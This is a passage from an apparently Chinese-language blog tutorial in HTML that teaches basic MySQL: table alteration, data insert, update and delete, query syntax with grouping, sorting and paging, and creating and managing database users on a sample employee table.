COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>\n\n<p>案例: 将emp表的nickname字段修改为username，类型为varchar(30)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>4). 删除字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 DROP 字段名;</span><br></pre></td></tr></table></figure>\n\n<p>案例: 将emp表的字段username删除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE emp DROP username;</span><br></pre></td></tr></table></figure>\n\n<p>5). 修改表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 RENAME TO 新表名;</span><br></pre></td></tr></table></figure>\n\n<p>案例:</p>\n<p> 将emp表的表名修改为 employee</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE emp RENAME TO employee;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h4><p>1). 删除表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DROP TABLE [ IF EXISTS ] 表名;</span><br><span class=\"line\">DROP TABLE IF EXISTS tb_user;</span><br></pre></td></tr></table></figure>\n\n<p>2). 删除指定表, 并重新创建表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TRUNCATE TABLE 表名;-- 在删除表的时候，表中的全部数据也都会被删除。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"图形化界面工具\"><a href=\"#图形化界面工具\" class=\"headerlink\" title=\"图形化界面工具\"></a>图形化界面工具</h2><p>主流工具：sqlyog、Navicate、DataGrip</p>\n<p>这次使用DataGrip</p>\n<p>还挺好用，不会的sql可以在这里面看对于语句。</p>\n<h2 id=\"DML\"><a href=\"#DML\" class=\"headerlink\" title=\"DML\"></a>DML</h2><h3 id=\"添加数据（INSERT）\"><a href=\"#添加数据（INSERT）\" class=\"headerlink\" title=\"添加数据（INSERT）\"></a>添加数据（INSERT）</h3><p>1). 给指定字段添加数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);</span><br><span class=\"line\">insert into employee(id,workno,name,gender,age,idcard,entrydate)</span><br><span class=\"line\">values(1,&#x27;1&#x27;,&#x27;Itcast&#x27;,&#x27;男&#x27;,10,&#x27;123456789012345678&#x27;,&#x27;2000-01-01&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">insert into employee values(3,&#x27;3&#x27;,&#x27;韦一笑&#x27;,&#x27;男&#x27;,38,&#x27;123456789012345670&#x27;,&#x27;2005-01-</span><br><span class=\"line\">01&#x27;),(4,&#x27;4&#x27;,&#x27;赵敏&#x27;,&#x27;女&#x27;,18,&#x27;123456789012345670&#x27;,&#x27;2005-01-01&#x27;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"修改数据（UPDATE）\"><a href=\"#修改数据（UPDATE）\" class=\"headerlink\" title=\"修改数据（UPDATE）\"></a>修改数据（UPDATE）</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">UPDATE 表名 SET 字段名1 = 值1 , 字段名2 = 值2 , .... [ WHERE 条件 ] ;</span><br><span class=\"line\">update employee set name = &#x27;itheima&#x27; where id = 1;</span><br><span class=\"line\">update employee set name = &#x27;小昭&#x27; , gender = &#x27;女&#x27; where id = 1;</span><br><span class=\"line\">update employee set entrydate = &#x27;2008-01-01&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"删除数据（DELETE）\"><a href=\"#删除数据（DELETE）\" class=\"headerlink\" title=\"删除数据（DELETE）\"></a>删除数据（DELETE）</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DELETE FROM 表名 [ WHERE 条件 ] ;</span><br><span class=\"line\">delete from employee where gender = &#x27;女&#x27;;</span><br><span class=\"line\">delete from employee;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"DOL\"><a href=\"#DOL\" class=\"headerlink\" title=\"DOL\"></a>DOL</h2><p>DQL英文全称是Data Query Language(数据查询语言)，数据查询语言，用来查询数据库中表的记 录。</p>\n<p>数据准备:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">drop table if exists employee;</span><br><span class=\"line\">create table emp(</span><br><span class=\"line\">id int comment &#x27;编号&#x27;,</span><br><span class=\"line\">workno varchar(10) comment &#x27;工号&#x27;,</span><br><span class=\"line\">name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class=\"line\">gender char(1) comment &#x27;性别&#x27;,</span><br><span class=\"line\">age tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class=\"line\">idcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class=\"line\">workaddress varchar(50) comment &#x27;工作地址&#x27;,</span><br><span class=\"line\">entrydate date comment &#x27;入职时间&#x27;</span><br><span class=\"line\">)comment &#x27;员工表&#x27;;</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (1, &#x27;00001&#x27;, &#x27;柳岩666&#x27;, &#x27;女&#x27;, 20, &#x27;123456789012345678&#x27;, &#x27;北京&#x27;, &#x27;2000-01-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (2, &#x27;00002&#x27;, &#x27;张无忌&#x27;, &#x27;男&#x27;, 18, &#x27;123456789012345670&#x27;, &#x27;北京&#x27;, &#x27;2005-09-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (3, &#x27;00003&#x27;, &#x27;韦一笑&#x27;, &#x27;男&#x27;, 38, &#x27;123456789712345670&#x27;, &#x27;上海&#x27;, &#x27;2005-08-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (4, &#x27;00004&#x27;, &#x27;赵敏&#x27;, &#x27;女&#x27;, 18, &#x27;123456757123845670&#x27;, &#x27;北京&#x27;, &#x27;2009-12-01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (5, &#x27;00005&#x27;, &#x27;小昭&#x27;, &#x27;女&#x27;, 16, &#x27;123456769012345678&#x27;, &#x27;上海&#x27;, &#x27;2007-07-01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (6, &#x27;00006&#x27;, &#x27;杨逍&#x27;, &#x27;男&#x27;, 28, &#x27;12345678931234567X&#x27;, &#x27;北京&#x27;, &#x27;2006-01-01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (7, &#x27;00007&#x27;, &#x27;范瑶&#x27;, &#x27;男&#x27;, 40, &#x27;123456789212345670&#x27;, &#x27;北京&#x27;, &#x27;2005-05-01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (8, &#x27;00008&#x27;, &#x27;黛绮丝&#x27;, &#x27;女&#x27;, 38, &#x27;123456157123645670&#x27;, &#x27;天津&#x27;, &#x27;2015-05-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (9, &#x27;00009&#x27;, &#x27;范凉凉&#x27;, &#x27;女&#x27;, 45, &#x27;123156789012345678&#x27;, &#x27;北京&#x27;, &#x27;2010-04-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (10, &#x27;00010&#x27;, &#x27;陈友谅&#x27;, &#x27;男&#x27;, 53, &#x27;123456789012345670&#x27;, &#x27;上海&#x27;, &#x27;2011-01-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (11, &#x27;00011&#x27;, &#x27;张士诚&#x27;, &#x27;男&#x27;, 55, &#x27;123567897123465670&#x27;, &#x27;江苏&#x27;, &#x27;2015-05-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (12, &#x27;00012&#x27;, &#x27;常遇春&#x27;, &#x27;男&#x27;, 32, &#x27;123446757152345670&#x27;, &#x27;北京&#x27;, &#x27;2004-02-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (13, &#x27;00013&#x27;, &#x27;张三丰&#x27;, &#x27;男&#x27;, 88, &#x27;123656789012345678&#x27;, &#x27;江苏&#x27;, &#x27;2020-11-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (14, &#x27;00014&#x27;, &#x27;灭绝&#x27;, &#x27;女&#x27;, 65, &#x27;123456719012345670&#x27;, &#x27;西安&#x27;, &#x27;2019-05-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (15, &#x27;00015&#x27;, &#x27;胡青牛&#x27;, &#x27;男&#x27;, 70, &#x27;12345674971234567X&#x27;, &#x27;西安&#x27;, &#x27;2018-04-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (16, &#x27;00016&#x27;, &#x27;周芷若&#x27;, &#x27;女&#x27;, 18, null, &#x27;北京&#x27;, &#x27;2012-06-01&#x27;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基本语法\"><a href=\"#基本语法\" class=\"headerlink\" title=\"基本语法\"></a>基本语法</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT</span><br><span class=\"line\">字段列表</span><br><span class=\"line\">FROM</span><br><span class=\"line\">表名列表</span><br><span class=\"line\">WHERE</span><br><span class=\"line\">条件列表</span><br><span class=\"line\">GROUP BY</span><br><span class=\"line\">分组字段列表</span><br><span class=\"line\">HAVING</span><br><span class=\"line\">分组后条件列表</span><br><span class=\"line\">ORDER BY</span><br><span class=\"line\">排序字段列表</span><br><span class=\"line\">LIMIT</span><br><span class=\"line\">分页参数</span><br></pre></td></tr></table></figure>\n\n<p>基本查询（不带任何条件） 条件查询（WHERE） 聚合函数（count、max、min、avg、sum） 分组查询（group by） 排序查询（order by） 分页查询（limit）</p>\n<h3 id=\"基础查询\"><a href=\"#基础查询\" class=\"headerlink\" title=\"基础查询\"></a>基础查询</h3><p>1). 查询多个字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段1, 字段2, 字段3 ... FROM 表名 ;</span><br><span class=\"line\">SELECT * FROM 表名 ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 字段设置别名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段1 [ AS 别名1 ] , 字段2 [ AS 别名2 ] ... FROM 表名;</span><br><span class=\"line\">SELECT 字段1 [ 别名1 ] , 字段2 [ 别名2 ] ... FROM 表名;</span><br></pre></td></tr></table></figure>\n\n<p>3). 去除重复记录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT DISTINCT 字段列表 FROM 表名;</span><br></pre></td></tr></table></figure>\n\n<p>eg:</p>\n<p>A. 查询指定字段 name, workno, age并返回</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select name,workno,age from emp;</span><br></pre></td></tr></table></figure>\n\n<p>B. 查询返回所有字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id ,workno,name,gender,age,idcard,workaddress,entrydate from emp;</span><br><span class=\"line\">select * from emp;</span><br></pre></td></tr></table></figure>\n\n<p>C. 查询所有员工的工作地址,起别名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select workaddress as &#x27;工作地址&#x27; from emp;</span><br><span class=\"line\">-- as可以省略</span><br><span class=\"line\">select workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>\n\n<p>D. 查询公司员工的上班地址有哪些(不要重复)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select distinct workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"条件查询\"><a href=\"#条件查询\" class=\"headerlink\" title=\"条件查询\"></a>条件查询</h3><p>1). 语法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段列表 FROM 表名 WHERE 条件列表 ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 条件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230306090357474.png\" alt=\"image-20230306090357474\"></p>\n<p>eg</p>\n<p>A. 查询年龄等于 88 的员工</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age = 88;</span><br></pre></td></tr></table></figure>\n\n<p>B. 查询年龄小于 20 的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age &lt; 20;</span><br></pre></td></tr></table></figure>\n\n<p>C. 查询年龄小于等于 20 的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age &lt;= 20;</span><br></pre></td></tr></table></figure>\n\n<p>D. 查询没有身份证号的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where idcard is null;</span><br></pre></td></tr></table></figure>\n\n<p>E.查询有身份证号的员工信</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where idcard is not null;</span><br></pre></td></tr></table></figure>\n\n<p>F:查询年龄不等于 88 的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age != 88;</span><br><span class=\"line\">select * from emp where age &lt;&gt; 88;</span><br></pre></td></tr></table></figure>\n\n<p>G. 查询年龄在15岁(包含) 到 20岁(包含)之间的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age &gt;= 15 &amp;&amp; age &lt;= 20;</span><br><span class=\"line\">select * from emp where age &gt;= 15 and age &lt;= 20;</span><br><span class=\"line\">select * from emp where age between 15 and 20;</span><br></pre></td></tr></table></figure>\n\n<p>H. 查询性别为 女 且年龄小于 25岁的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where gender = &#x27;女&#x27; and age &lt; 25;</span><br></pre></td></tr></table></figure>\n\n<p>I. 查询年龄等于18 或 20 或 40 的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age = 18 or age = 20 or age =40;</span><br><span class=\"line\">select * from emp where age in(18,20,40);</span><br></pre></td></tr></table></figure>\n\n<p>J. 查询姓名为两个字的员工信息 _ %</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where name like &#x27;__&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>k. 查询身份证号最后一位是X的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where idcard like &#x27;%X&#x27;;</span><br><span class=\"line\">select * from emp where idcard like &#x27;_________________X&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"聚合函数\"><a href=\"#聚合函数\" class=\"headerlink\" title=\"聚合函数\"></a>聚合函数</h3><p>1). 介绍 将一列数据作为一个整体，进行纵向计算 。</p>\n<p>2). 常见的聚合函数</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">函数</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">count</td>\n<td align=\"center\">统计数量</td>\n</tr>\n<tr>\n<td align=\"center\">max</td>\n<td align=\"center\">最大值</td>\n</tr>\n<tr>\n<td align=\"center\">min</td>\n<td align=\"center\">最小值</td>\n</tr>\n<tr>\n<td align=\"center\">avg</td>\n<td align=\"center\">平均值</td>\n</tr>\n<tr>\n<td align=\"center\">sum</td>\n<td align=\"center\">求和</td>\n</tr>\n</tbody></table>\n<p>A. 统计该企业员工数量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select count(*) from emp; -- 统计的是总记录数</span><br><span class=\"line\">select count(idcard) from emp; -- 统计的是idcard字段不为null的记录数</span><br></pre></td></tr></table></figure>\n\n<p>B. 统计该企业员工的平均年龄</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select avg(age) from emp;</span><br></pre></td></tr></table></figure>\n\n<p>C. 统计该企业员工的最大年龄</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select max(age) from emp;</span><br></pre></td></tr></table></figure>\n\n<p>D. 统计该企业员工的最小年龄</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select min(age) from emp;</span><br></pre></td></tr></table></figure>\n\n<p>E. 统计西安地区员工的年龄之和</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select sum(age) from emp where workaddress = &#x27;西安&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"分组查询\"><a href=\"#分组查询\" class=\"headerlink\" title=\"分组查询\"></a>分组查询</h3><p>1). 语法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组</span><br><span class=\"line\">后过滤条件 ];</span><br></pre></td></tr></table></figure>\n\n<p>2). where与having区别</p>\n<p>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组 之后对结果进行过滤。 </p>\n<p>判断条件不同：where不能对聚合函数进行判断，而having可以。</p>\n<p>A. 根据性别分组 , 统计男性员工 和 女性员工的数量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select gender, count(*) from emp group by gender ;</span><br></pre></td></tr></table></figure>\n\n<p>B. 根据性别分组 , 统计男性员工 和 女性员工的平均年龄</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select gender, avg(age) from emp group by gender ;</span><br></pre></td></tr></table></figure>\n\n<p>C. 查询年龄小于45的员工 , 并根据工作地址分组 , 获取员工数量大于等于3的工作地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select workaddress, count(*) address_count from emp where age &lt; 45 group by</span><br><span class=\"line\">workaddress having address_count &gt;= 3;</span><br></pre></td></tr></table></figure>\n\n<p>D. 统计各个工作地址上班的男性及女性员工的数量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select workaddress, gender, count(*) &#x27;数量&#x27; from emp group by gender , workaddress</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"排序查询\"><a href=\"#排序查询\" class=\"headerlink\" title=\"排序查询\"></a>排序查询</h3><p>1). 语法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1 , 字段2 排序方式2 ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 排序方式</p>\n<p>ASC : 升序(默认值) DESC: 降序</p>\n<p>注意事项：</p>\n<p> •如果是升序, 可以不指定排序方式ASC ; </p>\n<p>• 如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序 ;</p>\n<p>A. 根据年龄对公司的员工进行升序排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp order by age asc;</span><br><span class=\"line\">select * from emp order by age;</span><br></pre></td></tr></table></figure>\n\n<p>B. 根据入职时间, 对员工进行降序排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp order by entrydate desc;</span><br></pre></td></tr></table></figure>\n\n<p>C. 根据年龄对公司的员工进行升序排序 , 年龄相同 , 再按照入职时间进行降序排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"分页查询\"><a href=\"#分页查询\" class=\"headerlink\" title=\"分页查询\"></a>分页查询</h3><p>1). 语法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数 ;</span><br></pre></td></tr></table></figure>\n\n<p>A. 查询第1页员工数据, 每页展示10条记录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp limit 0,10;</span><br><span class=\"line\">select * from emp limit 10;</span><br></pre></td></tr></table></figure>\n\n<p>B. 查询第2页员工数据, 每页展示10条记录 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp limit 10,10;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"案例-1\"><a href=\"#案例-1\" class=\"headerlink\" title=\"案例\"></a>案例</h3><p>1). 查询年龄为20,21,22,23岁的女员工信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where gender = &#x27;女&#x27; and age in(20,21,22,23);</span><br></pre></td></tr></table></figure>\n\n<p>2). 查询性别为 男 ，并且年龄在 20-40 岁(含)以内的姓名为三个字的员工。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where gender = &#x27;男&#x27; and ( age between 20 and 40 ) and name like</span><br><span class=\"line\">&#x27;___&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>3). 统计员工表中, 年龄小于60岁的 , 男性员工和女性员工的人数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select gender, count(*) from emp where age &lt; 60 group by gender;</span><br></pre></td></tr></table></figure>\n\n<p>4). 查询所有年龄小于等于35岁员工的姓名和年龄，并对查询结果按年龄升序排序，如果年龄相同按 入职时间降序排序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select name , age from emp where age &lt;= 35 order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>\n\n<p>5). 查询性别为男，且年龄在20-40 岁(含)以内的前5个员工信息，对查询的结果按年龄升序排序， 年龄相同按入职时间升序排序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where gender = &#x27;男&#x27; and age between 20 and 40 order by age asc ,</span><br><span class=\"line\">entrydate asc limit 5 ;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"执行顺序\"><a href=\"#执行顺序\" class=\"headerlink\" title=\"执行顺序\"></a>执行顺序</h3><p>DQL执行顺序</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309085943559.png\" alt=\"image-20230309085943559\"></p>\n<p>验证：</p>\n<p>查询年龄大于15的员工姓名、年龄，并根据年龄进行升序排序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select name , age from emp where age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>\n\n<p>在查询时，我们给emp表起一个别名 e，然后在select 及 where中使用该别名。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select e.name , e.age from emp e where e.age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>\n\n<p>可以正常的查询到结果,此时就说明： from 先执行, 然后 where 和 select 执行。</p>\n<p>那 where 和 select 到底哪个先执行呢? </p>\n<p>此时，此时我们可以给select后面的字段起别名，然后在 where 中使用这个别名，然后看看是否可 以执行成功。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select e.name ename , e.age eage from emp e where eage &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>\n\n<p>SQL报错了,可以得出结论: from 先执行，然后执行 where ， 再执行select 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select e.name ename , e.age eage from emp e where e.age &gt; 15 order by eage asc;</span><br></pre></td></tr></table></figure>\n\n<p>成功,就验证了: order by 是在select 语句之后执行的。</p>\n<p><strong>综上所述，我们可以看到DQL语句的执行顺序为： from … where … group by … having … select … order by … limit …</strong></p>\n<h2 id=\"DCL\"><a href=\"#DCL\" class=\"headerlink\" title=\"DCL\"></a>DCL</h2><p>DCL英文全称是Data Control Language(数据控制语言)，用来管理数据库用户、控制数据库的访 问权限。</p>\n<h3 id=\"管理用户\"><a href=\"#管理用户\" class=\"headerlink\" title=\"管理用户\"></a>管理用户</h3><p>1). 查询用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from mysql.user;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309090928741.png\" alt=\"image-20230309090928741\"></p>\n<p>其中 Host代表当前用户访问的主机, 如果为localhost, 仅代表只能够在当前本机访问，是不可以 远程访问的。 User代表的是访问该数据库的用户名。在MySQL中需要通过Host和User来唯一标识一 个用户。</p>\n<p>2). 创建用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED BY &#x27;密码&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>3). 修改用户密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;新密码&#x27; ;</span><br></pre></td></tr></table></figure>\n\n<p>4). 删除用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DROP USER &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">注意事项:</span><br><span class=\"line\">• 在MySQL中需要通过用户名@主机名的方式，来唯一标识一个用户。</span><br><span class=\"line\">• 主机名可以使用 % 通配。</span><br><span class=\"line\">• 这类SQL开发人员操作的比较少，主要是DBA（ Database Administrator 数据库管理员）使用。</span><br></pre></td></tr></table></figure>\n\n<p>案例：</p>\n<p>A. 创建用户itcast, 只能够在当前主机localhost访问, 密码123456;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create user &#x27;itcast&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>B. 创建用户heima, 可以在任意主机访问该数据库, 密码123456;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create user &#x27;heima&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>C. 修改用户heima的访问密码为1234;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">alter user &#x27;heima&#x27;@&#x27;%&#x27; identified with mysql_native_password by &#x27;1234&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>D. 删除 itcast@localhost 用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">drop user &#x27;itcast&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"权限控制\"><a href=\"#权限控制\" class=\"headerlink\" title=\"权限控制\"></a>权限控制</h3><p>MySQL中定义了很多种权限,<a href=\"https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html\">MySQL :: MySQL 8.0 Reference Manual :: 6.2.2 Privileges Provided by MySQL</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309092308658.png\" 